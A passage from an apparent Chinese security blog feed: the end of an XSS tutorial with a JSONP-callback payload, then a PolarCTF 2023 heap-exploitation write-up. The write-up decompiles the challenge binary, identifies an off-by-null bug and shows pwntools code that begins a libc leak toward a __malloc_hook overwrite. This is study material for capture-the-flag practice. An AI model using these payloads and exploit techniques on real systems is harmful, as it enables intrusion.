<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// josnp.php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: application/json; charset=UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;</span><br><span class="line">	$callback = $_GET[&#x27;callback&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>json.php</code> 中的参数通过 <code>get</code> 方式获取，且没有做过滤。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011155419031.png"
                      alt="image-20231011155419031"
                ></p>
<p>通过 <code>POST</code> 传参将 <code>payload:</code> <code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;xss&#39;);&quot;&gt;&lt;/script&gt;</code> 上传即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>PolarCTF2023秋赛:夕阳下的舞者</title>
    <url>/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/</url>
    <content><![CDATA[<h1 id="562-5Liq5Yiw"><a href="#562-5Liq5Yiw" class="headerlink" title="562+5Liq5Yiw"></a>562+5Liq5Yiw</h1><h2 id="检查文件信息"><a href="#检查文件信息" class="headerlink" title="检查文件信息"></a>检查文件信息</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180215833.png"
                      alt="image-20230911180215833"
                ></p>
<p><code>ELF64</code>位小端序程序，动态链接。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180407139.png"
                      alt="image-20230911180407139"
                ></p>
<p>除了<code>FODRTIFY</code>保护，其余保护全开。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so ./562+5Liq5Yiw</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so ./562+5Liq5Yiw</span><br></pre></td></tr></table></figure></div>

<p>将环境修改为题目的运行环境。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_A9D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Welcome to Chicken farm!!! \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Delete a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Cook a chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Chicken you are so beautiful.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.EXIT.&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_A9D()</code>函数为程序菜单。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_A50</span>(a1, a2, a3);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;==:.........................................................................=..::::..=:::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===-:.......................................................................=..=-:=:.=:.:::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=====-......................................................................=..-:.=:.=:..::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=======:.........................................:..........................=..:--=..=:...:::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;========-:......................................:-=++-......................=..=.:=..=:....::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;==========-....................................:+**###+:....................=-::-----=:......::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===========-...............................:--:.+######=....................=.-:-:-:.=:.......:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:-=========-.............................:+###*:*#+#+*=:...................:=.---:--.=:........::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::-=======-............................:######:####+-......................-::::.::.=:.........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::--=====-...........................:#++####=+####:.......................:--------..........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::--===-...........................#++++++#*-#++##:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::-==-..........................*++++++++#:+++++*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::--..........................+++++++++#++#++++-.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::..........................#++++++++#++#++++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::.........................=+++++++#+++##+++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..:::::::::::::........................*+++++#++++++#++:.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....:::::::::::::.......................#++++#=++++++#*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......:::::::::::::.....................++*##**#++++#=:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........:::::::::::::..................-==++++++*##*=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........:::::::::::::................-======+==+++..............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...........:::::::::::::..............-===+++++++++-.............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.............:::::::::::::...........:===++++++++++=:............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...............:::::::::::::.........===++*+-=***+++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;................::::::::::::::......-=+++*=...-*++++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..................:::::::::::::....-==+++-.....=++++=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....................:::::::::::::..==+++-.......+++++-...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......................::::::::::::-=++*=........:*+++=...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........................::::::::::=+++-..........:+*++-.........................................:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........................::::::::-==+=:...........:+===........................................::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::.......................:::::-==++::::..........====:......................................:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::----===+=::::::::::::::-+==-:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-==++:::::::::::::::-+===::::::::::::::::::::::::::::::::::::-----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-=++-::::::::::::::::+===:::::::::::::::::::::::::::::::::::::----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::=++=:::::::::::::::::====:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::-+++::::::::::::::::::-+++::::::::::::::::::::::::::::::::::::::::-\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::+#+:::::::::::::::::::::*#-::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::##+:::::::::::::::::::::*#*::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::-*###:::::::::::::::::::::###+:::::::::::::::::::::::::::::::::::::::&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="built_in">sub_A9D</span>();</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">sub_BFC</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">sub_D28</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_EB3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_1005</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到是一道菜单题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_BFC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">sub_B34</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken nest collapsed!!! \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">1</span>) = <span class="built_in">malloc</span>(*v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">3</span>) = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">2</span>) = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_B74</span>(*((_QWORD *)v2 + <span class="number">1</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="type">void</span> **)v2 + <span class="number">2</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">    dword_203060[v1] = <span class="number">1</span>;</span><br><span class="line">    qword_203080[v1] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BFC()</code>函数创建了一个结构体，并且可以自定义<code>chicken</code>大小。数组<code>qword_203080</code>记录了每一个<code>chicken</code>,数组<code>dword_203060</code>记录了<code>qword_203060</code>的使用情况。可以向<code>mark</code>和<code>name</code>读入内容。并且未将<code>v2+3</code>处的内容初始化，可能存在泄露。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Chicken</span> &#123;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">	<span class="type">void</span>* name;</span><br><span class="line">	<span class="type">void</span>* mark;</span><br><span class="line">	<span class="type">void</span>* msg; <span class="comment">// 后面分析得知，这里记载的菜名。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>根据读入情况，不难分析出结构体的内容。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B34</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_203060[i] )</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B34()</code>函数用于查看<code>qword_203060</code>数组的使用情况。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">sub_B74</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, a1, a2);</span><br><span class="line">  result = &amp;a1[a2];</span><br><span class="line">  *result &amp;= ~<span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B74()</code>函数置零操作存在<code>off-by-null</code>漏洞。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_D28</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)qword_203080[v1] = <span class="number">0</span>;</span><br><span class="line">    dword_203060[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">8LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">16LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">24LL</span>));</span><br><span class="line">    qword_203080[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken has already been cooked. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_D28()</code>函数用于释放多块，没有问题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_EB3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Old name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me new name.&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>), *(<span class="type">int</span> *)qword_203080[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;New name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me Cook name.&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_BC0</span>(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m Ni gun ma i u. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_EB3()</code>函数用于改名字，并记录菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">sub_BC0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[a1] + <span class="number">24LL</span>), <span class="number">0x80</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BC0()</code>函数用于读取菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1005</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The chicken %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    <span class="keyword">if</span> ( dword_203060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Name \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m ErrMsg \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">24LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Mark \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">16LL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_1005()</code>函数用于打印所有信息。这里菜名被标记为<code>ErrMsg</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>sub_BFC()</code>函数未初始化的<code>ErrMsg(菜名)</code>和<code>sub_1005()</code>来进行信息泄露，得到<code>heap</code>和<code>libc</code>地址。然后利用<code>off-by-null</code>漏洞制造堆块重叠，向<code>fastbin</code>中写入<code>__malloc_hook</code>地址，然后篡改其为<code>one_gadget</code>来获取权限。</p>
<h3 id="前置脚本"><a href="#前置脚本" class="headerlink" title="前置脚本"></a>前置脚本</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>定义了函数接口和前置操作。</p>
<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure></div>

